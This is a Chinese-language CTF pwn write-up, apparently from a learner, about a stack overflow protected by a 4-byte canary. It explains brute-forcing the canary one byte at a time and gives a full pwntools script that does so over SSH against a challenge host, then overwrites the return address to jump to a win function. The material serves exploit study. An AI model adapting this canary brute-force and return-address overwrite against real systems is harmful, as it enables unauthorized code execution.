这题又是新的没遇到过的类型，我的pwn学习之路还真是挺坎坷啊...

简单介绍，这题有可以溢出的地方，并且可以自己控制读取的输入长度。但是存在一个4字节的cannary。我一开始想：4字节=32bit=2^32次方种可能，这怎么爆啊。但实际上因为我们可以控制程序获取输入的长度，所以我们完全没有必要要一次性爆破4字节的内容，我们可以第一次只覆盖一个字节的cannary，根据服务端回应信息来爆破，之后再将输入长度加1，逐个爆破剩余的字节。

```python
from pwn import *

s = ssh(host='node4.buuoj.cn', port=29718, user='CTFMan', password='guest')

win_addr = 0x80486eb
payload = b'a'*0x20
offset_to_cannary = 32
for i in range(1,5):
    for j in range(256):
        p = s.run('./vuln')
        p.sendlineafter(b'Buffer?\n>', str(offset_to_cannary+i))
        cannary_one_byte = bytes([j])
        send_payload = payload + cannary_one_byte
        # p.info('try {:d} in {:s}'.format(j, send_payload.decode()))
        p.sendlineafter(b'Input> ', send_payload)
        if b'Stack Smashing Detected' in p.recv():
            continue
        payload += cannary_one_byte
        print('cannary[{:d}]: 0x{}'.format(i-1, cannary_one_byte.hex()))
        break

log.info('canary: 0x{}'.format(payload[-4:].hex()))
payload = payload.ljust(0x30+4, b'a')
payload += p32(win_addr)

p = s.run('./vuln')
p.sendlineafter(b'Buffer?\n>', str(0x30+4+4))
p.sendlineafter(b'Input> ', payload)

p.interactive()
```